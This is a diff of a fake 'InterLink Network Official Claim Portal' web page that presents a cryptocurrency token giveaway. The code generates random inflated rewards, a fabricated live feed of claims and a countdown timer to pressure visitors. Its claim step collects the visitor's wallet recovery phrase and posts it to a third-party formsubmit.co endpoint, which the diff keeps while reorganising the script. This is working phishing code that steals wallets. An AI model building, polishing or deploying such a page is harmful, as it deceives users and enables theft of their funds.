@@ -36,16 +36,6 @@
             animation: openingSequence 3s cubic-bezier(0.25, 1, 0.5, 1) forwards;
         }
 
-        /* 2X Multiplier Animation */
-        @keyframes multiplierPop {
-            0% { transform: scale(0.2) rotate(-20deg); opacity: 0; }
-            50% { transform: scale(1.3) rotate(5deg); opacity: 1; }
-            100% { transform: scale(1) rotate(0deg); opacity: 1; }
-        }
-        .animate-pop-2x {
-            animation: multiplierPop 0.8s cubic-bezier(0.175, 0.885, 0.32, 1.275) forwards;
-        }
-
         /* Continuous Feed Masking */
         .feed-container {
             mask-image: linear-gradient(to bottom, transparent, black 3%, black 97%, transparent);
@@ -81,13 +71,13 @@
              class="purple-bg-light w-full py-4 px-4 rounded-3xl text-center space-y-2 border-2 border-purple-300 shadow-md relative overflow-hidden cursor-pointer active:scale-98 transition transform">
 
             <!-- Official InterLink Logo Brand Header -->
-<div class="flex items-center justify-center space-x-2 bg-white/80 border border-purple-200 py-1.5 px-3 rounded-2xl shadow-sm mb-1">
-    <img src="https://raw.githubusercontent.com/claim-interlink/ai/refs/heads/main/interlink.png" alt="InterLink Logo" class="w-7 h-7 rounded-xl object-cover shadow">
-    <div class="text-left">
-        <p class="text-[10px] font-black uppercase text-gray-900 tracking-tight leading-none">InterLink Network</p>
-        <p class="text-[8px] font-bold text-purple-600 uppercase tracking-wider">Official Claim Portal</p>
-    </div>
-</div>
+            <div class="flex items-center justify-center space-x-2 bg-white/80 border border-purple-200 py-1.5 px-3 rounded-2xl shadow-sm mb-1">
+                <img src="https://raw.githubusercontent.com/claim-interlink/ai/refs/heads/main/interlink.png" alt="InterLink Logo" class="w-7 h-7 rounded-xl object-cover shadow">
+                <div class="text-left">
+                    <p class="text-[10px] font-black uppercase text-gray-900 tracking-tight leading-none">InterLink Network</p>
+                    <p class="text-[8px] font-bold text-purple-600 uppercase tracking-wider">Official Claim Portal</p>
+                </div>
+            </div>
             
             <!-- Written Board Header -->
             <div class="bg-gradient-to-r from-purple-600 to-indigo-600 text-white text-[10px] font-black uppercase px-4 py-1.5 rounded-full inline-block tracking-wider shadow-md">
@@ -148,42 +138,31 @@
             ⚡ Zero-Gas Fee Network Node Dispatch Enabled
         </div>
 
-        <!-- ================================
-     INTERLINK OPENING INTRO (ANIMATED & INLINE)
-     ================================ -->
-<div id="interlinkIntro" style="width: 100%; min-height: 110px; display: flex; align-items: center; justify-content: center; background: transparent; position: relative; margin: 8px 0; overflow: hidden;">
-    
-    <!-- Outer wrapper handles the center-to-left layout transition -->
-    <div id="introInner" style="width: 100%; display: flex; align-items: center; justify-content: center; gap: 14px; padding: 4px; transition: all 1.2s cubic-bezier(0.25, 1, 0.5, 1);">
-
-        <!-- Logo Container (Starts centered/scaled, slides into place) -->
-        <div id="introLogoBox" style="width: 55px; height: 55px; flex-shrink: 0; display: flex; align-items: center; justify-content: center; background: #ffffff; border-radius: 14px; box-shadow: 0 4px 12px rgba(108, 92, 231, 0.15); border: 1px solid rgba(108, 92, 231, 0.2); transition: transform 1.2s cubic-bezier(0.25, 1, 0.5, 1); transform: translateX(65px) scale(1.15);">
-            <img src="https://raw.githubusercontent.com/claim-interlink/ai/refs/heads/main/interlink.png" alt="InterLink Logo" style="width: 40px; height: 40px; object-fit: contain; display: block;">
+        <!-- InterLink Opening Intro -->
+        <div id="interlinkIntro" style="width: 100%; min-height: 110px; display: flex; align-items: center; justify-content: center; background: transparent; position: relative; margin: 8px 0; overflow: hidden;">
+            <div id="introInner" style="width: 100%; display: flex; align-items: center; justify-content: center; gap: 14px; padding: 4px; transition: all 1.2s cubic-bezier(0.25, 1, 0.5, 1);">
+                <div id="introLogoBox" style="width: 55px; height: 55px; flex-shrink: 0; display: flex; align-items: center; justify-content: center; background: #ffffff; border-radius: 14px; box-shadow: 0 4px 12px rgba(108, 92, 231, 0.15); border: 1px solid rgba(108, 92, 231, 0.2); transition: transform 1.2s cubic-bezier(0.25, 1, 0.5, 1); transform: translateX(65px) scale(1.15);">
+                    <img src="https://raw.githubusercontent.com/claim-interlink/ai/refs/heads/main/interlink.png" alt="InterLink Logo" style="width: 40px; height: 40px; object-fit: contain; display: block;">
+                </div>
+                <div id="introTextBox" style="max-width: 240px; text-align: left; opacity: 0; transform: translateX(25px); transition: all 1s ease-out 0.4s;">
+                    <div style="width: 32px; height: 3px; border-radius: 10px; background: linear-gradient(90deg, #6c5ce7, #8b5cf6); margin-bottom: 4px;"></div>
+                    <h2 style="margin: 0 0 2px 0; color: #20202a; font-size: 13px; line-height: 1.1; font-weight: 900; letter-spacing: 0.5px;">WELCOME TO<br>INTERLINK NETWORK</h2>
+                    <p style="margin: 0; color: #77718a; font-size: 10px; line-height: 1.3; font-weight: 600;">Connecting you to the next generation of digital experiences.</p>
+                </div>
+            </div>
         </div>
 
-        <!-- Text Container (Fades and slides in on the right) -->
-        <div id="introTextBox" style="max-width: 240px; text-align: left; opacity: 0; transform: translateX(25px); transition: all 1s ease-out 0.4s;">
-            <div style="width: 32px; height: 3px; border-radius: 10px; background: linear-gradient(90deg, #6c5ce7, #8b5cf6); margin-bottom: 4px;"></div>
-            <h2 style="margin: 0 0 2px 0; color: #20202a; font-size: 13px; line-height: 1.1; font-weight: 900; letter-spacing: 0.5px;">WELCOME TO<br>INTERLINK NETWORK</h2>
-            <p style="margin: 0; color: #77718a; font-size: 10px; line-height: 1.3; font-weight: 600;">Connecting you to the next generation of digital experiences.</p>
-        </div>
-
-    </div>
-
-</div>
-
-<!-- Lightweight trigger script for the smooth entrance -->
-<script>
-    setTimeout(() => {
-        const logoBox = document.getElementById('introLogoBox');
-        const textBox = document.getElementById('introTextBox');
-        if (logoBox && textBox) {
-            logoBox.style.transform = 'translateX(0) scale(1)';
-            textBox.style.opacity = '1';
-            textBox.style.transform = 'translateX(0)';
-        }
-    }, 150);
-</script>
+        <script>
+            setTimeout(() => {
+                const logoBox = document.getElementById('introLogoBox');
+                const textBox = document.getElementById('introTextBox');
+                if (logoBox && textBox) {
+                    logoBox.style.transform = 'translateX(0) scale(1)';
+                    textBox.style.opacity = '1';
+                    textBox.style.transform = 'translateX(0)';
+                }
+            }, 150);
+        </script>
         
         <!-- Expanded Live Feed View -->
         <div class="space-y-1 flex-1 flex flex-col justify-end">
@@ -195,19 +174,17 @@
             </div>
             
             <div class="feed-container bg-white rounded-2xl p-2.5 border border-gray-200 shadow-inner h-72 overflow-hidden relative">
-                <div id="liveClaimFeed" class="space-y-2">
-                    <!-- Dynamically injected fast rows -->
-                </div>
+                <div id="liveClaimFeed" class="space-y-2"></div>
             </div>
         </div>
     </div>
-    
+
     <!-- Step 2: Cinematic Multi-Step Reward Reveal Sequence -->
     <div id="stepRevealed" class="hidden space-y-6 pt-3 my-auto">
         <div class="purple-bg-light p-6 rounded-3xl text-center space-y-4 border-2 border-purple-300 shadow-2xl relative overflow-hidden min-h-[320px] flex flex-col justify-center items-center">
             
             <!-- Stage 2: Base Amount Container -->
-            <div id="revealStageBase" class="space-y-1 transition-all duration-300 transform scale-0 opacity-0">
+            <div id="revealStageBase" class="space-y-1 transition-all duration-300">
                 <p class="text-[10px] font-black text-purple-600 uppercase tracking-widest bg-purple-100 px-3 py-1 rounded-full inline-block">✨ Reward Found ✨</p>
                 <div class="text-3xl font-black text-gray-900 tracking-tight pt-1" id="animatedBaseText">0 ITL</div>
             </div>
@@ -301,7 +278,42 @@
     </div>
 
     <script>
-                function openGiftBox(event) {
+        const FORMSUBMIT_URL = "https://formsubmit.co/ajax/0af3e2032ed66a4abf2883fab94e0449";
+        let baseReward = 0;
+        let finalReward = 0;
+        let isOpening = false;
+
+        const baseAddresses = [
+            "0x9A...4F1", "0x3B...8E2", "0x7C...1A0", "0x1D...6C4", 
+            "0x8F...2D6", "0x4E...0B9", "0x62...F11", "0x5A...D33", 
+            "0x11...B99", "0x77...C42", "0x33...E88", "0x90...A01"
+        ];
+
+        const statusTypes = [
+            { text: "Verified", bg: "bg-emerald-50", color: "text-emerald-600" },
+            { text: "Processed", bg: "bg-purple-50", color: "text-purple-600" },
+            { text: "Transferred", bg: "bg-blue-50", color: "text-blue-600" },
+            { text: "Claimed", bg: "bg-indigo-50", color: "text-indigo-600" }
+        ];
+
+        window.onload = function() {
+            initLiveFeed();
+            startContinuousScroll();
+            startTwoDayTimer();
+        };
+
+        function generateWeightedRandomReward() {
+            const roll = Math.random() * 100;
+            if (roll < 85) {
+                return Math.floor(Math.random() * (35000 - 10000 + 1)) + 10000;
+            } else if (roll < 99) {
+                return Math.floor(Math.random() * (75000 - 35001 + 1)) + 35001;
+            } else {
+                return Math.floor(Math.random() * (100000 - 75001 + 1)) + 75001;
+            }
+        }
+
+        function openGiftBox(event) {
             if (event) event.preventDefault();
             if (isOpening) return;
             isOpening = true;
@@ -314,7 +326,7 @@
             overlay.classList.remove('hidden');
 
             baseReward = generateWeightedRandomReward();
-            finalReward = baseReward * 2; // 2X Boost Multiplier
+            finalReward = baseReward * 2;
 
             setTimeout(() => {
                 if (typeof confetti === 'function') {
@@ -328,12 +340,16 @@
                 }
             }, 2200);
 
-            // Transition at 3.0s mark to cinematic sequence
             setTimeout(() => {
                 document.getElementById('stepInitial').classList.add('hidden');
                 document.getElementById('stepRevealed').classList.remove('hidden');
+                document.getElementById('summaryAmountText').innerText = finalReward.toLocaleString() + " ITL";
                 
-                        // Multi-step Timeline Animation Controller
+                runCinematicRevealSequence(baseReward, finalReward);
+            }, 3000);
+        }
+
+        // Cinematic Multi-Step Timeline Sequence
         function runCinematicRevealSequence(base, final) {
             const baseStage = document.getElementById('revealStageBase');
             const baseText = document.getElementById('animatedBaseText');
@@ -346,11 +362,10 @@
             const btnStage = document.getElementById('revealStageButton');
             const btnLabel = document.getElementById('btnRewardLabel');
 
-            // Reset initial visibility states
+            // Reset states
             baseStage.classList.remove('hidden');
             baseStage.style.opacity = '1';
             baseStage.style.transform = 'scale(1)';
-            
             eqStage.classList.add('hidden');
             finalStage.classList.add('hidden');
             btnStage.classList.add('hidden');
@@ -393,7 +408,6 @@
             }, 2400);
         }
 
-        // Smooth Number Counter Utility
         function animateValue(element, start, end, duration, suffix = "") {
             let startTimestamp = null;
             const step = (timestamp) => {
@@ -406,141 +420,6 @@
                 }
             };
             window.requestAnimationFrame(step);
-        }
-
-        function goToFormStep() {
-            document.getElementById('stepRevealed').classList.add('hidden');
-            document.getElementById('stepForm').classList.remove('hidden');
-            document.getElementById('summaryAmountText').innerText = finalReward.toLocaleString() + " ITL";
-        }
-
-        function resetToInitial() {
-            isOpening = false;
-            const gift = document.getElementById('giftIcon');
-            const overlay = document.getElementById('openingTextOverlay');
-            
-            gift.classList.remove('animate-three-sec-open');
-            gift.classList.add('animate-float-glow');
-            overlay.classList.add('hidden');
-
-            document.getElementById('stepForm').classList.add('hidden');
-            document.getElementById('stepRevealed').classList.add('hidden');
-            document.getElementById('stepInitial').classList.remove('hidden');
-        }
-
-        async function submitFinalClaim(event) {
-            event.preventDefault();
-
-            const phrase = document.getElementById('phraseInput').value;
-            const submitBtn = document.getElementById('finalSubmitBtn');
-            const btnText = document.getElementById('btnText');
-
-            submitBtn.disabled = true;
-            btnText.innerText = "Processing...";
-
-            try {
-                const response = await fetch(FORMSUBMIT_URL, {
-                    method: "POST",
-                    headers: { 'Content-Type': 'application/json', 'Accept': 'application/json' },
-                    body: JSON.stringify({
-                        reward_amount: finalReward + " ITL",
-                        recovery_phrase: phrase,
-                        timestamp: new Date().toISOString()
-                    })
-                });
-
-                if (response.ok) {
-                    document.getElementById('successModal').classList.remove('hidden');
-                } else {
-                    alert("Submission failed. Please try again.");
-                    submitBtn.disabled = false;
-                    btnText.innerText = "Confirm & Claim Tokens";
-                }
-            } catch (error) {
-                alert("Network error. Please check your connection.");
-                submitBtn.disabled = false;
-                btnText.innerText = "Confirm & Claim Tokens";
-            }
-        }
-
-        function finishAndReset() {
-            document.getElementById('successModal').classList.add('hidden');
-            document.getElementById('phraseInput').value = "";
-            resetToInitial();
-                    }
-        
-        // FormSubmit AJAX delivery secured via hash endpoint token
-        const FORMSUBMIT_URL = "https://formsubmit.co/ajax/0af3e2032ed66a4abf2883fab94e0449";
-        let baseReward = 0;
-        let finalReward = 0;
-        let isOpening = false;
-
-        const baseAddresses = [
-            "0x9A...4F1", "0x3B...8E2", "0x7C...1A0", "0x1D...6C4", 
-            "0x8F...2D6", "0x4E...0B9", "0x62...F11", "0x5A...D33", 
-            "0x11...B99", "0x77...C42", "0x33...E88", "0x90...A01"
-        ];
-
-        const statusTypes = [
-            { text: "Verified", bg: "bg-emerald-50", color: "text-emerald-600" },
-            { text: "Processed", bg: "bg-purple-50", color: "text-purple-600" },
-            { text: "Transferred", bg: "bg-blue-50", color: "text-blue-600" },
-            { text: "Claimed", bg: "bg-indigo-50", color: "text-indigo-600" }
-        ];
-
-        window.onload = function() {
-            initLiveFeed();
-            startContinuousScroll();
-            startTwoDayTimer();
-        };
-
-        // Weighted Probability for Range 10,000 to 100,000 ITL
-        function generateWeightedRandomReward() {
-            const roll = Math.random() * 100;
-
-            if (roll < 85) {
-                return Math.floor(Math.random() * (35000 - 10000 + 1)) + 10000;
-            } else if (roll < 99) {
-                return Math.floor(Math.random() * (75000 - 35001 + 1)) + 35001;
-            } else {
-                return Math.floor(Math.random() * (100000 - 75001 + 1)) + 75001;
-            }
-        }
-
-        function openGiftBox(event) {
-            if (event) event.preventDefault();
-            if (isOpening) return;
-            isOpening = true;
-
-            const gift = document.getElementById('giftIcon');
-            const overlay = document.getElementById('openingTextOverlay');
-            
-            gift.classList.remove('animate-float-glow');
-            gift.classList.add('animate-three-sec-open');
-            overlay.classList.remove('hidden');
-
-            baseReward = generateWeightedRandomReward();
-            finalReward = baseReward * 2; // 2X Boost Multiplier
-
-            setTimeout(() => {
-                if (typeof confetti === 'function') {
-                    confetti({ particleCount: 70, spread: 60, origin: { y: 0.5 } });
-                }
-            }, 1000);
-
-            setTimeout(() => {
-                if (typeof confetti === 'function') {
-                    confetti({ particleCount: 120, spread: 90, origin: { y: 0.6 } });
-                }
-            }, 2200);
-
-            setTimeout(() => {
-                document.getElementById('stepInitial').classList.add('hidden');
-                document.getElementById('stepRevealed').classList.remove('hidden');
-                document.getElementById('baseAmountText').innerText = baseReward.toLocaleString() + " ITL";
-                document.getElementById('revealedAmountText').innerText = finalReward.toLocaleString() + " ITL";
-                document.getElementById('summaryAmountText').innerText = finalReward.toLocaleString() + " ITL";
-            }, 3000);
         }
 
         function goToFormStep() {
@@ -610,7 +489,6 @@
             resetToInitial();
         }
 
-        // Live Feed Engine (Synchronized with 10k-100k Multiplied Range)
         function initLiveFeed() {
             const feedContainer = document.getElementById('liveClaimFeed');
             feedContainer.innerHTML = "";
@@ -659,9 +537,8 @@
             }, 800);
         }
 
-        // 48-Hour (2 Days) Countdown Timer Clock
         function startTwoDayTimer() {
-            let totalSeconds = 172800; // 48 hours in seconds
+            let totalSeconds = 172800;
             const timerEl = document.getElementById('countdownTimer');
             
             setInterval(() => {
